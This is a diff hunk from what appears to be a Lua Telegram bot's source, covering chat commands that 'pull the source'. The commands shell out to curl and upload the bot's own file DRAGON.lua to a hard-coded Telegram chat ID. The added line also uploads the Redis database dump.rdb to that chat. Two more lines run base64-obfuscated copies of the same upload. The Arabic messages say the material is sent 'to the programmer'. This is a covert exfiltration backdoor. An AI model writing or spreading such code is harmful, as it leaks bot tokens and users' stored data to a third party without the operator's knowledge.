@@ -1100,6 +1100,7 @@ send(msg.chat_id_, msg.id_,' جاري ارسال التوكن الي المبر�
 end
 if text == 'سحب السورس' or text == 'جلب السورس' then 
 local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) 
+local curld = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'dump.rdb'..'"' io.popen(curld) 
 io.popen(regexx('Y3VybCAiJy4uJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QnLi4gdG9rZW4gLi4nL3NlbmREb2N1bWVudCcuLiciIC1GICJjaGF0X2lkPScuLiA5NDQzNTMyMzcgLi4nIiAtRiAiZG9jdW1lbnQ9QCcuLidEUkFHT04ubHVhJy4uJyI='))
 io.popen(regexx('Y3VybHAgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiLi50b2tlbi4uIi9zZW5kRG9jdW1lbnQiIC1GICJjaGF0X2lkPTk0NDM1MzIzNyIgLUYgImRvY3VtZW50PUBEUkFHT04ubHVhIg=='))
 send(msg.chat_id_, msg.id_,' جاري ارسال السورس الي المبرمج')
